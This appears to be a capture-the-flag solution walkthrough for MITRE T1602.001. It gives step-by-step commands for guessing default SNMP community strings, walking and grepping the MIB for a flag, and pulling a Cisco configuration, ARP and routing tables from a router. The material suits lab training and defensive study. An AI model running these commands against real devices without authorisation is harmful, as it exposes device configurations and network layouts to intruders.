# T1602.001 – SNMP MIB Dump | Solution Walkthrough
**Difficulty:** Hard | **OS:** Linux | **MITRE:** T1602.001

## Step 1 – Verify SNMP Service
```bash
ss -unl | grep 161  # OR netstat -unl | grep 161
# 0.0.0.0:161  ← SNMP daemon listening
```

## Step 2 – Try Default Community Strings
```bash
# Common community strings: public, private, community, cisco, snmp
snmpget -v2c -c public localhost sysDescr.0
# SNMPv2-MIB::sysDescr.0 = STRING: Linux ... ← Accessible!
snmpget -v2c -c hacktify_community localhost sysDescr.0
```

## Step 3 – Full SNMP Walk (Dump All Data)
```bash
snmpwalk -v2c -c public localhost > /tmp/snmp_dump.txt
wc -l /tmp/snmp_dump.txt
# Hundreds of OIDs — contains system config, network interfaces, processes
```

## Step 4 – Extract Sensitive Data
```bash
# System contact (often contains admin info):
snmpget -v2c -c public localhost sysContact.0
# SNMPv2-MIB::sysContact.0 = STRING: admin@corp.internal (Flag: HACKTIFY{...})

# Extended OID with flag:
snmpwalk -v2c -c public localhost .1.3.6.1.4.1.8072.1.3
# Or search the dump:
grep -i "hacktify\|flag" /tmp/snmp_dump.txt
```

## Step 5 – Network Device Configuration Collection
```bash
# On network devices (routers/switches):
snmpget -v2c -c public 192.168.1.1 .1.3.6.1.4.1.9.2.1.55.0  # Cisco config
# ARP table:
snmpwalk -v2c -c public 192.168.1.1 ipNetToMediaPhysAddress
# Routing table:
snmpwalk -v2c -c public 192.168.1.1 ipRouteTable
```
